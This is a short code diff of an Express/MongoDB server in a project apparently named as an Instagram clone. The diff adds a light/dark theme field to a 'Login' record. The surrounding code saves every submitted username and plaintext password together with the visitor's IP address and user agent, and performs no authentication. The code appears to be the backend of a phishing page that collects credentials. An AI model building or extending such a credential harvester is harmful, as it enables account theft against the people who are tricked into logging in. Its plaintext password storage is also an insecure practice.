@@ -30,10 +30,15 @@ mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/igclone',
 app.use(bodyParser.json());
 app.use(express.static(path.join(__dirname, '..', 'public')));
 
-// Modello dei dati di login
+// Modello dei dati di login aggiornato con informazioni sul tema
 const LoginSchema = new mongoose.Schema({
   username: String,
   password: String,
+  theme: {
+    type: String,
+    enum: ['light', 'dark'],
+    default: 'light'
+  },
   timestamp: {
     type: Date,
     default: Date.now
@@ -47,12 +52,13 @@ const Login = mongoose.model('Login', LoginSchema);
 // Route per salvare i dati di login
 app.post('/api/login', async (req, res) => {
   try {
-    const { username, password } = req.body;
+    const { username, password, theme } = req.body;
     
     // Salva i dati di login nel database
     const login = new Login({
       username,
       password,
+      theme: theme || 'light',
       ipAddress: req.ip,
       userAgent: req.headers['user-agent']
     });
